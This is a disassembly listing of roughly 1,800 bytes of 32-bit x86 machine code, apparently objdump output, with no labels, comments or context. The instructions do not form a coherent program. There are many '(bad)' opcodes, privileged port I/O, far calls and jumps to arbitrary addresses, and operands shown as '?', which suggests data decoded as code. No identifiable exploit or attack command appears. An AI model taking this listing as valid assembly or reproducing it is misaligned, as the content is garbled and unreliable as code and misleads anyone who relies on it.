  41c93a:	stos   BYTE PTR es:[edi],al
  41c93b:	and    bl,dl
  41c93d:	jbe    0x41c923
  41c93f:	int3   
  41c940:	mov    ds:0xe754b884,al
  41c945:	fs inc edi
  41c947:	sti    
  41c948:	(bad)  [eax]
  41c94a:	stos   BYTE PTR es:[edi],al
  41c94b:	push   0x20
  41c94d:	jp     0x41c9bc
  41c94f:	mov    ds:0x302873d9,eax
  41c954:	stos   DWORD PTR es:[edi],eax
  41c955:	mov    BYTE PTR [esi+0x77],bl
  41c958:	shl    BYTE PTR [ecx],0xdc
  41c95b:	and    al,BYTE PTR [ecx-0x693732fd]
  41c961:	stos   BYTE PTR es:[edi],al
  41c962:	jb     0x41c92d
  41c964:	call   0xafe3cfa2
  41c969:	rcl    DWORD PTR [edi],0xb5
  41c96c:	repnz add esi,DWORD PTR [eax-0x38]
  41c970:	adc    BYTE PTR [ecx-0x1b],dh
  41c973:	add    eax,0x73efcac6
  41c978:	sbb    DWORD PTR [eax+0x5416125b],ecx
  41c97e:	pop    edx
  41c97f:	daa    
  41c980:	pop    esp
  41c981:	lock in eax,0xb5
  41c984:	mov    dh,0xe8
  41c986:	bound  esp,QWORD PTR [ebp-0x71bb766d]
  41c98c:	call   0x8eb6:0x485c74c2
  41c993:	push   es
  41c994:	or     bl,BYTE PTR [edi]
  41c996:	adc    eax,0x33ca6196
  41c99b:	lods   al,BYTE PTR ds:[esi]
  41c99c:	popf   
  41c99d:	sub    al,0xb4
  41c99f:	fldcw  WORD PTR [edx]
  41c9a1:	das    
  41c9a2:	xchg   edi,eax
  41c9a3:	or     eax,0x902bfbff
  41c9a8:	or     BYTE PTR [edx],bl
  41c9aa:	xor    esi,esi
  41c9ac:	mov    ah,al
  41c9ae:	push   ss
  41c9af:	push   cs
  41c9b0:	dec    eax
  41c9b1:	in     eax,dx
  41c9b2:	sbb    DWORD PTR [ebp+0x28],esp
  41c9b5:	push   0xffffffee
  41c9b7:	mov    al,ds:0x1ade99dc
  41c9bc:	push   ebp
  41c9bd:	or     al,0xc6
  41c9bf:	inc    edi
  41c9c0:	add    DWORD PTR [ebp-0x59],ecx
  41c9c3:	mov    bh,0x87
  41c9c5:	pop    edx
  41c9c6:	retf   0x71d3
  41c9c9:	retf   0x378e
  41c9cc:	imul   ecx,esp,0x5c8c8ff8
  41c9d2:	mov    esi,0x36d5e28b
  41c9d7:	les    esi,FWORD PTR [ebp-0x58]
  41c9da:	iret   
  41c9db:	xor    eax,0x61e98b96
  41c9e0:	cmp    DWORD PTR [di],ebp
  41c9e3:	nop
  41c9e4:	pop    esi
  41c9e5:	sbb    eax,0x64b0096
  41c9ea:	add    edi,edx
  41c9ec:	(bad)  ds:0xec11
  41c9f1:	push   ebx
  41c9f2:	cmp    DWORD PTR [edx-0x668c95c4],esi
  41c9f8:	mov    ch,0x4e
  41c9fa:	push   eax
  41c9fb:	cmp    DWORD PTR [ecx],edx
  41c9fd:	loopne 0x41c9d2
  41c9ff:	push   ebx
  41ca00:	jecxz  0x41c9a5
  41ca02:	add    al,0xd4
  41ca04:	and    BYTE PTR [edi],bl
  41ca06:	pop    ss
  41ca07:	jecxz  0x41ca6c
  41ca09:	sbb    al,0xb2
  41ca0b:	call   0x33a21b10
  41ca10:	ss pop esi
  41ca12:	and    eax,0xcbb8eb41
  41ca17:	(bad)  
  41ca18:	sub    bh,BYTE PTR [eax-0x459c4604]
  41ca1e:	out    dx,al
  41ca1f:	pop    ecx
  41ca20:	lea    eax,[esi-0xd]
  41ca23:	xchg   edx,eax
  41ca24:	test   al,0x7b
  41ca26:	xor    al,0xbb
  41ca28:	and    DWORD PTR [edx-0x5d],ecx
  41ca2b:	icebp  
  41ca2c:	out    0xc3,al
  41ca2e:	xor    eax,0x8fdacca8
  41ca33:	mov    ch,0x9
  41ca35:	data16 shr BYTE PTR [edi],1
  41ca38:	pushf  
  41ca39:	jecxz  0x41ca9b
  41ca3b:	mov    ebp,0xff7ec580
  41ca40:	cld    
  41ca41:	xchg   ecx,eax
  41ca42:	pop    esi
  41ca43:	aas    
  41ca44:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ca45:	into   
  41ca46:	mov    ah,0x85
  41ca48:	or     edx,ecx
  41ca4a:	inc    ecx
  41ca4b:	sbb    ah,BYTE PTR [edi+0x23]
  41ca4e:	push   cs
  41ca4f:	fcmove st,st(0)
  41ca51:	sub    eax,DWORD PTR [eax-0x2e1f5aa0]
  41ca57:	push   esp
  41ca58:	xchg   DWORD PTR [eax+0x3175c331],eax
  41ca5e:	push   ebp
  41ca5f:	div    esi
  41ca61:	and    al,0xab
  41ca63:	xchg   esp,eax
  41ca64:	sub    dl,BYTE PTR [esi+0x433d5b10]
  41ca6a:	fisub  DWORD PTR [ebx+edx*2+0x5cea0737]
  41ca71:	cmp    dl,ch
  41ca73:	inc    ecx
  41ca74:	pop    ecx
  41ca75:	sbb    ch,ah
  41ca77:	sub    ch,ch
  41ca79:	push   edx
  41ca7a:	adc    edx,DWORD PTR [edx-0x33]
  41ca7d:	pop    esi
  41ca7e:	fcomp  QWORD PTR [edx+0x1fd9c0ae]
  41ca84:	lock mov ecx,0xe81ff9fc
  41ca8a:	in     eax,dx
  41ca8b:	int    0x77
  41ca8d:	push   0xffffffec
  41ca8f:	add    bl,bh
  41ca91:	ror    DWORD PTR [edi],cl
  41ca93:	mov    esi,0x26f2e202
  41ca98:	jo     0x41ca89
  41ca9a:	sub    eax,0xb6f7aa85
  41ca9f:	dec    edx
  41caa0:	sbb    al,ah
  41caa2:	ja     0x41ca5f
  41caa4:	adc    bh,BYTE PTR [ebp+0x3f]
  41caa7:	lods   eax,DWORD PTR ds:[esi]
  41caa8:	rcl    esp,1
  41caaa:	mov    edx,0x7f5d18e5
  41caaf:	test   al,0x65
  41cab1:	pop    ss
  41cab2:	out    dx,al
  41cab3:	add    BYTE PTR [ebp+0xbf9ecc4],0xdd
  41caba:	cmp    BYTE PTR [esi-0x334dfa3f],bh
  41cac0:	out    0xae,al
  41cac2:	mov    gs,WORD PTR [esi+edi*4+0x56]
  41cac6:	sar    ah,cl
  41cac8:	mov    ebx,0xdd0e5afc
  41cacd:	push   eax
  41cace:	push   0x16960ecf
  41cad3:	push   cs
  41cad4:	sbb    BYTE PTR [ebx],0x91
  41cad7:	jno    0x41ca69
  41cad9:	out    0x78,al
  41cadb:	xchg   ah,dl
  41cadd:	mov    gs:0x7512d44d,al
  41cae3:	test   DWORD PTR [ecx+0x3],0xa927a03e
  41caea:	jae    0x41cb31
  41caec:	inc    ebp
  41caed:	inc    ebx
  41caee:	cmp    eax,0x4b1d11a8
  41caf3:	sar    DWORD PTR [edi],cl
  41caf5:	sar    BYTE PTR [esi],0x62
  41caf8:	frstor [ecx]
  41cafa:	sub    DWORD PTR [esi+ebx*2-0xe08c9aa],0xb34c76ce
  41cb05:	sti    
  41cb06:	shl    DWORD PTR [ebx+ecx*8+0x463df1f9],0xba
  41cb0e:	stos   DWORD PTR es:[edi],eax
  41cb0f:	and    BYTE PTR [ebp-0x61],0x74
  41cb13:	pop    ds
  41cb14:	cmp    eax,0x38079174
  41cb19:	lods   al,BYTE PTR ds:[esi]
  41cb1a:	xor    al,0xc1
  41cb1c:	xchg   esi,eax
  41cb1d:	loopne 0x41cb26
  41cb1f:	mov    al,0xf2
  41cb21:	sub    al,0x8
  41cb23:	mov    eax,0xc9955e20
  41cb28:	cld    
  41cb29:	out    0x79,al
  41cb2b:	add    ah,BYTE PTR [edx-0x9ce4d14]
  41cb31:	ins    DWORD PTR es:[edi],dx
  41cb32:	lods   eax,DWORD PTR ds:[si]
  41cb34:	lods   eax,DWORD PTR ds:[esi]
  41cb35:	out    0x68,al
  41cb37:	cmc    
  41cb38:	sub    ch,BYTE PTR [ebx+0x51]
  41cb3b:	mov    esp,0x342db4b3
  41cb40:	and    eax,0x9f1ce69d
  41cb45:	sub    BYTE PTR ds:0xce4a69d2,cl
  41cb4b:	xor    DWORD PTR [esi+0x508db968],0xc36499fa
  41cb55:	add    al,0x12
  41cb57:	(bad)  
  41cb58:	in     eax,dx
  41cb59:	lds    esi,FWORD PTR ds:0x5d5a5ee
  41cb5f:	icebp  
  41cb60:	mov    bl,0x34
  41cb62:	jo     0x41cae8
  41cb64:	jbe    0x41cbb2
  41cb66:	(bad)  
  41cb67:	retf   
  41cb68:	push   ds
  41cb69:	mov    esi,0x74d399e1
  41cb6e:	retf   0x3b72
  41cb71:	inc    ebp
  41cb72:	jp     0x41cbdc
  41cb74:	mov    al,ds:0x3f269f31
  41cb79:	ja     0x41cbbf
  41cb7b:	adc    ebx,ebp
  41cb7d:	sti    
  41cb7e:	rcl    DWORD PTR [ebx-0x58528d62],0xe9
  41cb85:	sahf   
  41cb86:	mov    ecx,0x7cf3fb9b
  41cb8b:	test   BYTE PTR [ecx-0x36868482],bh
  41cb91:	cs es adc dl,bh
  41cb95:	mov    esi,0xc01bf92f
  41cb9a:	imul   esp,eax,0x4d1d6b76
  41cba0:	lahf   
  41cba1:	adc    dh,BYTE PTR [esi]
  41cba3:	cld    
  41cba4:	lock mov DWORD PTR [esi+eiz*4],eax
  41cba8:	jmp    FWORD PTR [ecx-0x5bc42c5d]
  41cbae:	inc    eax
  41cbaf:	je     0x41cb80
  41cbb1:	sub    eax,0xade1672a
  41cbb6:	retf   
  41cbb7:	out    0x8f,eax
  41cbb9:	arpl   si,si
  41cbbb:	out    0x4a,eax
  41cbbd:	stos   BYTE PTR es:[edi],al
  41cbbe:	stos   BYTE PTR es:[edi],al
  41cbbf:	jbe    0x41cb6e
  41cbc1:	jo     0x41cbad
  41cbc3:	pusha  
  41cbc4:	push   esi
  41cbc5:	loop   0x41cb88
  41cbc7:	jbe    0x41cb4d
  41cbc9:	xchg   edx,eax
  41cbca:	xor    ebx,DWORD PTR [edx+esi*2]
  41cbcd:	add    al,cl
  41cbcf:	xchg   edi,eax
  41cbd0:	jg     0x41cba3
  41cbd2:	xchg   esi,eax
  41cbd3:	bound  ecx,QWORD PTR [ebp+0x3b0a299]
  41cbd9:	aam    0xb1
  41cbdb:	jns    0x41cc1a
  41cbdd:	jnp    0x41cbdc
  41cbdf:	(bad)  
  41cbe0:	(bad)  [ebx-0x25]
  41cbe3:	jo     0x41cc44
  41cbe5:	addr16 push cs
  41cbe7:	jno    0x41cb88
  41cbe9:	push   ecx
  41cbea:	stc    
  41cbeb:	not    BYTE PTR [eax]
  41cbed:	stc    
  41cbee:	jbe    0x41cbec
  41cbf0:	cmp    DWORD PTR [ebx],edi
  41cbf2:	fld    DWORD PTR [edi]
  41cbf4:	mov    BYTE PTR [ebp+0x3a1c14a8],dl
  41cbfa:	(bad)  
  41cbfb:	retf   0x2272
  41cbfe:	mov    edi,0x35a107c8
  41cc03:	cmc    
  41cc04:	in     eax,0xd9
  41cc06:	xlat   BYTE PTR ds:[ebx]
  41cc07:	(bad)  
  41cc08:	stc    
  41cc09:	jle    0x41cbf2
  41cc0b:	ja     0x41cbf0
  41cc0d:	pop    ss
  41cc0e:	int3   
  41cc0f:	adc    BYTE PTR [ebx],al
  41cc11:	mov    eax,0x1fa569a
  41cc16:	add    eax,0xcfa1b01a
  41cc1b:	add    DWORD PTR [edx+0x2afb4bb1],0xd925defa
  41cc25:	xor    al,0xc1
  41cc27:	js     0x41cc6a
  41cc29:	repz aam 0x22
  41cc2c:	sbb    eax,0xf24e61e5
  41cc31:	jp     0x41cbe3
  41cc33:	pop    ebp
  41cc34:	mov    ah,0x94
  41cc36:	xchg   edx,eax
  41cc37:	sbb    ch,ch
  41cc39:	mov    eax,0x8a756787
  41cc3e:	ins    BYTE PTR es:[edi],dx
  41cc3f:	push   ecx
  41cc40:	iret   
  41cc41:	dec    ebx
  41cc42:	jbe    0x41cc69
  41cc44:	add    eax,0x875c4bc3
  41cc49:	fsub   QWORD PTR ds:0x5ea312ec
  41cc4f:	into   
  41cc50:	cmp    DWORD PTR [ecx],esp
  41cc52:	adc    BYTE PTR [edx-0x2d],0xd6
  41cc56:	sub    BYTE PTR [ecx],al
  41cc58:	inc    edi
  41cc59:	nop
  41cc5a:	je     0x41ccd6
  41cc5c:	add    eax,DWORD PTR [esi+0x36]
  41cc5f:	in     eax,dx
  41cc60:	sbb    DWORD PTR [ebx+0x5f],ebp
  41cc63:	(bad)  
  41cc64:	mov    edx,0xffbd1f5d
  41cc69:	mov    ebx,0x6612d250
  41cc6e:	mov    ?,eax
  41cc70:	clc    
  41cc71:	gs ss cli 
  41cc74:	mov    edx,0xd9b29b99
  41cc79:	sbb    al,0x92
  41cc7b:	das    
  41cc7c:	cld    
  41cc7d:	pop    edx
  41cc7e:	and    eax,0x9b4bb4bb
  41cc83:	jb     0x41cc99
  41cc85:	or     BYTE PTR [ecx-0x22],cl
  41cc88:	mov    ebp,0x6a7fa14b
  41cc8d:	(bad)  
  41cc8e:	jbe    0x41cc58
  41cc90:	fbstp  TBYTE PTR ds:0x72cf23bb
  41cc96:	retf   0x98a
  41cc99:	push   esp
  41cc9a:	pop    ds
  41cc9b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cc9c:	push   esp
  41cc9d:	stos   BYTE PTR es:[edi],al
  41cc9e:	push   ebp
  41cc9f:	mov    ah,0x82
  41cca1:	fsubr  st,st(6)
  41cca3:	and    edi,DWORD PTR [esi+0x4481f724]
  41cca9:	sbb    DWORD PTR [edx-0x3a],edx
  41ccac:	dec    ebx
  41ccad:	sub    al,0x8d
  41ccaf:	js     0x41ccc3
  41ccb1:	outs   dx,DWORD PTR ds:[esi]
  41ccb2:	and    BYTE PTR [esi+0x627b1fe0],ah
  41ccb8:	xchg   esp,eax
  41ccb9:	sub    esp,DWORD PTR [ecx+ecx*8]
  41ccbc:	jne    0x41ccc8
  41ccbe:	cmp    al,0x61
  41ccc0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ccc1:	mov    eax,0xf2ca030c
  41ccc6:	dec    ebx
  41ccc7:	addr16 mov dl,0x15
  41ccca:	push   0xffffffb7
  41cccc:	call   0xfcb26e5a
  41ccd1:	cli    
  41ccd2:	fwait
  41ccd3:	cmp    sp,WORD PTR [edi]
  41ccd6:	(bad)  
  41ccd7:	xchg   esp,eax
  41ccd8:	xor    esi,DWORD PTR [edi+0x20710cfd]
  41ccde:	jae    0x41cd10
  41cce0:	outs   dx,DWORD PTR ds:[esi]
  41cce1:	or     ebp,ecx
  41cce3:	push   cs
  41cce4:	inc    edx
  41cce5:	loop   0x41ccde
  41cce7:	aam    0x9
  41cce9:	fiadd  WORD PTR [esi-0x6715a857]
  41ccef:	sahf   
  41ccf0:	idiv   BYTE PTR [eax+0x518b0a56]
  41ccf6:	xchg   ebx,eax
  41ccf7:	frstor [ebx+0x70]
  41ccfa:	pushf  
  41ccfb:	pop    edx
  41ccfc:	and    DWORD PTR [edi],ecx
  41ccfe:	mov    ebx,0x4d9da439
  41cd03:	or     ecx,DWORD PTR [ecx+0x22]
  41cd06:	mov    WORD PTR [ebx-0x3c],fs
  41cd09:	cmp    al,0x1c
  41cd0b:	jnp    0x41ccfc
  41cd0d:	push   edi
  41cd0e:	leave  
  41cd0f:	je     0x41ccc1
  41cd11:	(bad)  
  41cd12:	shl    esi,1
  41cd14:	xchg   BYTE PTR [ecx],dl
  41cd16:	jnp    0x41ccf3
  41cd18:	retf   
  41cd19:	ja     0x41cd24
  41cd1b:	stos   DWORD PTR es:[edi],eax
  41cd1c:	enter  0x77a8,0x66
  41cd20:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cd21:	add    eax,0xb4bd9198
  41cd26:	aaa    
  41cd27:	xchg   BYTE PTR [esp+eax*8+0x70],dh
  41cd2b:	(bad)  
  41cd2d:	(bad)  
  41cd2e:	(bad)  [ecx-0x50]
  41cd31:	xor    al,0xba
  41cd33:	lahf   
  41cd34:	xlat   BYTE PTR ds:[ebx]
  41cd35:	ins    DWORD PTR es:[edi],dx
  41cd36:	cmp    edi,DWORD PTR [ebx]
  41cd38:	int    0x78
  41cd3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cd3b:	stos   BYTE PTR es:[edi],al
  41cd3c:	sbb    bl,bl
  41cd3e:	or     dh,BYTE PTR [edi-0x266db060]
  41cd44:	cs xchg esp,eax
  41cd46:	or     al,0x61
  41cd48:	in     eax,0xdd
  41cd4a:	jae    0x41cd06
  41cd4c:	pop    es
  41cd4d:	pusha  
  41cd4e:	mov    edi,0x4253584d
  41cd53:	fimul  DWORD PTR [edi-0x42]
  41cd56:	sub    ch,BYTE PTR [esi]
  41cd58:	sbb    ebx,DWORD PTR [eax]
  41cd5a:	fucomi st,st(2)
  41cd5c:	mov    al,0xaf
  41cd5e:	xor    eax,0x9e57c73a
  41cd63:	(bad)  
  41cd64:	jmp    0x41cd2b
  41cd66:	sub    eax,0xb943fe27
  41cd6b:	push   ecx
  41cd6c:	aas    
  41cd6d:	hlt    
  41cd6e:	rol    DWORD PTR [edx+edi*8-0x40],1
  41cd72:	shl    ecx,cl
  41cd74:	ficom  WORD PTR [eax-0x75]
  41cd77:	fninit 
  41cd79:	pop    edi
  41cd7a:	inc    esp
  41cd7b:	pop    esi
  41cd7c:	adc    DWORD PTR [edx],edx
  41cd7e:	aas    
  41cd7f:	pop    es
  41cd80:	(bad)  
  41cd81:	xlat   BYTE PTR ds:[ebx]
  41cd82:	sbb    DWORD PTR [esi],eax
  41cd84:	ins    DWORD PTR es:[edi],dx
  41cd85:	mul    DWORD PTR [edi+0x4e]
  41cd88:	ins    BYTE PTR es:[edi],dx
  41cd89:	fwait
  41cd8a:	and    DWORD PTR [edx],esp
  41cd8c:	fnstenv [edx]
  41cd8e:	push   esp
  41cd8f:	or     ecx,edx
  41cd91:	dec    esp
  41cd92:	jo     0x41cd71
  41cd94:	jecxz  0x41ce0f
  41cd96:	out    dx,al
  41cd97:	and    eax,0x43ecb1cc
  41cd9c:	leave  
  41cd9d:	leave  
  41cd9e:	xor    bh,BYTE PTR [ecx+0x44c19755]
  41cda4:	rcl    BYTE PTR [edi+eax*8+0x3436d133],cl
  41cdab:	aas    
  41cdac:	pushw  0x3e
  41cdaf:	(bad)  
  41cdb1:	(bad)  
  41cdb2:	es pop edi
  41cdb4:	mov    cs,WORD PTR [eax+0x19754019]
  41cdba:	sti    
  41cdbb:	mov    BYTE PTR [eax+0x3d],al
  41cdbe:	mov    ebx,ecx
  41cdc0:	mov    fs,WORD PTR [ebx+0x3a]
  41cdc3:	retf   0xdcc3
  41cdc6:	push   edi
  41cdc7:	mov    al,ds:0xc1eb33c2
  41cdcc:	push   ebp
  41cdcd:	pop    esp
  41cdce:	push   ebx
  41cdcf:	push   cs
  41cdd0:	push   eax
  41cdd1:	pop    ecx
  41cdd2:	inc    esi
  41cdd3:	mov    cs,WORD PTR [ecx+0x4d]
  41cdd6:	retf   
  41cdd7:	xchg   BYTE PTR [edi-0x1a],ch
  41cdda:	(bad)  
  41cddb:	ror    edx,1
  41cddd:	shl    BYTE PTR [ecx],1
  41cddf:	jno    0x41cdd0
  41cde1:	ret    
  41cde2:	or     dl,BYTE PTR [eax-0x791a2b0f]
  41cde8:	mov    edi,0x36ec6e
  41cded:	(bad)  
  41cdef:	dec    eax
  41cdf0:	imul   BYTE PTR [ebp-0x556ae96]
  41cdf6:	ror    DWORD PTR [edx-0x16],0x37
  41cdfa:	fcom   QWORD PTR [ebp+0x6b390447]
  41ce00:	rol    BYTE PTR [edx+ebx*2-0x2a8e08c4],1
  41ce07:	xor    al,0xa0
  41ce09:	xchg   ebp,eax
  41ce0a:	and    BYTE PTR [ebp+0x46273dd4],bl
  41ce10:	or     dh,ah
  41ce12:	jno    0x41cdb2
  41ce14:	xchg   esp,eax
  41ce15:	adc    eax,0x3575c036
  41ce1a:	inc    eax
  41ce1b:	(bad)  
  41ce1c:	jo     0x41ce11
  41ce1e:	loop   0x41ce3c
  41ce20:	dec    ebx
  41ce21:	ret    
  41ce22:	jb     0x41ce11
  41ce24:	(bad)  
  41ce25:	fimul  DWORD PTR [edi+0x7101e36b]
  41ce2b:	mov    esi,0x271bf0b0
  41ce30:	in     eax,0x50
  41ce32:	imul   edx,DWORD PTR [eax],0x16
  41ce35:	std    
  41ce36:	add    BYTE PTR [ecx-0x78d8a986],ah
  41ce3c:	pop    eax
  41ce3d:	or     eax,0x21adc24c
  41ce42:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ce43:	or     dl,ch
  41ce45:	sar    edx,cl
  41ce47:	or     ebp,DWORD PTR [ebx+0x3]
  41ce4a:	fimul  DWORD PTR [esi]
  41ce4c:	pop    es
  41ce4d:	or     al,0xf4
  41ce4f:	dec    ebx
  41ce50:	jne    0x41ce18
  41ce52:	pop    esp
  41ce53:	mov    fs,edi
  41ce55:	sbb    eax,esp
  41ce57:	nop
  41ce58:	or     dl,BYTE PTR [edi+0x23897d95]
  41ce5e:	and    BYTE PTR [eax-0x5d],ch
  41ce61:	sbb    al,0x7a
  41ce63:	dec    edx
  41ce64:	jbe    0x41ce26
  41ce66:	push   ebp
  41ce67:	lea    ebx,[eax+0x27]
  41ce6a:	sbb    BYTE PTR [edx],dl
  41ce6c:	push   cs
  41ce6d:	outs   dx,BYTE PTR ds:[esi]
  41ce6e:	scas   eax,DWORD PTR es:[edi]
  41ce6f:	inc    esi
  41ce70:	mov    al,ds:0x8e6fc76e
  41ce75:	lds    edi,FWORD PTR [ebx+0x1f]
  41ce78:	and    esp,DWORD PTR [esi]
  41ce7a:	sub    eax,0x46cfd9fb
  41ce7f:	ret    
  41ce80:	loopne 0x41ceac
  41ce82:	mov    ebx,0xf2e3d31d
  41ce87:	cmp    dl,BYTE PTR [esi+0xb3eabe2]
  41ce8d:	test   ecx,ebp
  41ce8f:	cli    
  41ce90:	lds    edi,FWORD PTR [esi]
  41ce92:	mov    eax,ds:0x17aad794
  41ce97:	sub    cl,BYTE PTR [esi+edi*1-0x10f3ea89]
  41ce9e:	into   
  41ce9f:	mov    ds:0x8a0f035e,eax
  41cea4:	test   eax,0x18f4d6a3
  41cea9:	nop
  41ceaa:	out    0xd3,eax
  41ceac:	jb     0x41ce30
  41ceae:	mov    ah,0xcd
  41ceb0:	jg     0x41ceee
  41ceb2:	jecxz  0x41cf31
  41ceb4:	enter  0x13a4,0x4e
  41ceb8:	loope  0x41ce3d
  41ceba:	cwde   
  41cebb:	sub    eax,0x8f65394e
  41cec0:	push   ss
  41cec1:	mov    ebp,0xfd74c6ba
  41cec6:	dec    ecx
  41cec7:	out    dx,eax
  41cec8:	fwait
  41cec9:	enter  0xc11c,0x77
  41cecd:	in     eax,dx
  41cece:	imul   ebx,DWORD PTR [edi-0x14e18a3b],0xf96ca4ea
  41ced8:	cmp    BYTE PTR [ebp+edx*1+0x7b],ah
  41cedc:	sub    bl,BYTE PTR [ebp-0x1ec73fba]
  41cee2:	mov    ch,0x11
  41cee4:	fsub   QWORD PTR [edi]
  41cee6:	adc    dl,BYTE PTR [esi+0x4e3dba77]
  41ceec:	sub    eax,DWORD PTR [ebp-0x3094d612]
  41cef2:	mov    ch,0x88
  41cef4:	mov    ds:0xede83bf2,al
  41cef9:	push   edx
  41cefa:	ds ins DWORD PTR es:[edi],dx
  41cefc:	jnp    0x41cf2f
  41cefe:	and    ebx,DWORD PTR [edx]
  41cf00:	mov    cs,edx
  41cf02:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cf03:	int    0x14
  41cf05:	dec    edx
  41cf06:	js     0x41ce9b
  41cf08:	jns    0x41cf0d
  41cf0a:	call   0xc1ae:0xd1f537ae
  41cf11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cf12:	push   ebp
  41cf13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cf14:	push   0xca226a08
  41cf19:	jecxz  0x41cf41
  41cf1b:	fxtract 
  41cf1d:	or     bl,BYTE PTR [ecx-0x209171f2]
  41cf23:	and    al,0xc6
  41cf25:	mov    dl,0x77
  41cf27:	into   
  41cf28:	mov    ah,0x1e
  41cf2a:	dec    edi
  41cf2b:	stos   BYTE PTR es:[edi],al
  41cf2c:	cmp    eax,0xbfb16cff
  41cf31:	xchg   edx,eax
  41cf32:	pop    edi
  41cf33:	sbb    DWORD PTR [ecx],esp
  41cf35:	popa   
  41cf36:	cmovle ebx,DWORD PTR [ebp+0x2a]
  41cf3a:	jmp    0x7778:0xda9dc028
  41cf41:	sub    eax,0x6b1dc819
  41cf46:	lods   eax,DWORD PTR ds:[esi]
  41cf47:	or     eax,0x52c2d534
  41cf4c:	ds (bad) 
  41cf4e:	add    edx,DWORD PTR [ecx+0x38]
  41cf51:	cli    
  41cf52:	enter  0x6548,0x2d
  41cf56:	pop    ebp
  41cf57:	xor    ebp,edx
  41cf59:	xchg   edi,eax
  41cf5a:	jp     0x41cf98
  41cf5c:	push   cs
  41cf5d:	push   cs
  41cf5e:	in     eax,0x61
  41cf60:	jns    0x41cf59
  41cf62:	mov    ebx,0x761483b4
  41cf67:	aam    0x3d
  41cf69:	sar    DWORD PTR [ebp+ebx*1+0x8933c21],cl
  41cf70:	pop    eax
  41cf71:	inc    ebx
  41cf72:	jecxz  0x41cfca
  41cf74:	add    BYTE PTR ds:0xdf5464e5,bh
  41cf7a:	jg     0x41cf8f
  41cf7c:	mov    dl,0x4a
  41cf7e:	add    al,0xea
  41cf80:	or     DWORD PTR [eax],ebx
  41cf82:	mov    BYTE PTR [esi+edi*1-0x5d],cl
  41cf86:	mov    ebx,0xfb85087c
  41cf8b:	pop    ds
  41cf8c:	daa    
  41cf8d:	mov    WORD PTR [eax-0x43],?
  41cf90:	(bad)  
  41cf91:	pop    eax
  41cf92:	lods   eax,DWORD PTR ds:[esi]
  41cf93:	imul   esi,DWORD PTR [ebx],0x1c
  41cf96:	xchg   ecx,eax
  41cf97:	pop    edi
  41cf98:	fwait
  41cf99:	push   0xffffffc6
  41cf9b:	jp     0x41cfe1
  41cf9d:	push   ecx
  41cf9e:	ins    BYTE PTR es:[edi],dx
  41cf9f:	mov    ebx,0x5a81bc48
  41cfa4:	(bad)  
  41cfa5:	jmp    0x41cf56
  41cfa7:	inc    edx
  41cfa8:	xchg   esi,eax
  41cfa9:	cmp    al,0x91
  41cfab:	ds mov dl,0xa
  41cfae:	(bad)
  41cfb3:	inc    esi
  41cfb4:	lahf   
  41cfb5:	inc    edx
  41cfb6:	shl    DWORD PTR [edi],cl
  41cfb8:	cmp    BYTE PTR [ebp+0x1d2e110a],dh
  41cfbe:	or     eax,0x7c628494
  41cfc3:	jmp    0x616c:0x66b3eb7b
  41cfca:	and    bh,dl
  41cfcc:	xchg   edi,eax
  41cfcd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cfce:	ja     0x41d00a
  41cfd0:	add    al,0x1b
  41cfd2:	out    0x5c,al
  41cfd4:	mov    edx,0xbf8995eb
  41cfd9:	mov    eax,0xfad2eb52
  41cfde:	ret    
  41cfdf:	cwde   
  41cfe0:	cs mov esi,0x62981d27
  41cfe6:	cmp    al,0xf9
  41cfe8:	add    DWORD PTR [ecx+0x28],0x81f63e53
  41cfef:	add    BYTE PTR [esi-0x3d7f7b72],ch
  41cff5:	mov    DWORD PTR [ebx-0x433de902],eax
  41cffb:	lods   eax,DWORD PTR ds:[esi]
  41cffc:	hlt    
  41cffd:	sbb    al,0x7f
  41cfff:	sbb    esp,DWORD PTR [edx-0x347bfa1a]
  41d005:	mov    esi,0xf44158bd
  41d00a:	mov    cl,0x1c
  41d00c:	xchg   esi,eax
  41d00d:	inc    esi
  41d00e:	ins    BYTE PTR es:[edi],dx
  41d00f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d010:	pop    ebx
  41d011:	sbb    DWORD PTR es:[esi],esp
  41d014:	adc    BYTE PTR [esi],ah
  41d016:	push   eax
  41d017:	stos   BYTE PTR es:[edi],al
  41d018:	mov    eax,0xb2c92782
  41d01d:	fwait
  41d01e:	add    DWORD PTR [edi],ebx
  41d020:	mov    cl,0xc
  41d022:	cdq    
  41d023:	lds    edx,FWORD PTR ds:0x3284ce55
  41d029:	and    BYTE PTR [edi],bl
  41d02b:	xchg   BYTE PTR [eax],bl
  41d02d:	mov    ds:0x51765bb3,eax
  41d032:	fisttp DWORD PTR [edi+edx*2]
  41d035:	lods   eax,DWORD PTR ds:[esi]
  41d036:	mov    ss,WORD PTR [edx-0x45]
  41d039:	mov    esi,0x21233d0e
  41d03e:	pop    ecx
  41d03f:	loop   0x41d0a1
  41d041:	sub    DWORD PTR [edx+0x248efe0d],ebx
  41d047:	repnz push ebx
  41d049:	ss mov cl,0xde
  41d04c:	fwait
  41d04d:	xor    ax,0x72cf
  41d051:	out    dx,eax
  41d052:	int3   
  41d053:	sti    
  41d054:	fs fwait
  41d056:	dec    esp
  41d057:	jne    0x41d01e
  41d059:	fnstsw WORD PTR [eax+ebx*4-0x55]
  41d05d:	inc    ebp
  41d05e:	mov    dh,0x4c
  41d060:	enter  0x4627,0xe6
  41d064:	push   esi
  41d065:	mov    bh,0x3d
  41d067:	or     al,0xa5
  41d069:	nop
  41d06a:	dec    eax
  41d06b:	imul   DWORD PTR [esi]
  41d06d:	or     dl,dl
  41d06f:	scas   al,BYTE PTR es:[edi]
  41d070:	ins    BYTE PTR es:[edi],dx
  41d071:	pop    ebx
  41d072:	sbb    eax,0x108b6d7c
  41d077:	sbb    al,0x7
  41d079:	inc    eax
  41d07a:	pop    ebp
  41d07b:	test   eax,0xe8f1ec79
  41d080:	or     BYTE PTR [edi],dl
  41d082:	data16 data16 hlt 
  41d085:	mov    dh,0x68
  41d087:	or     BYTE PTR [edi+eax*2],ah
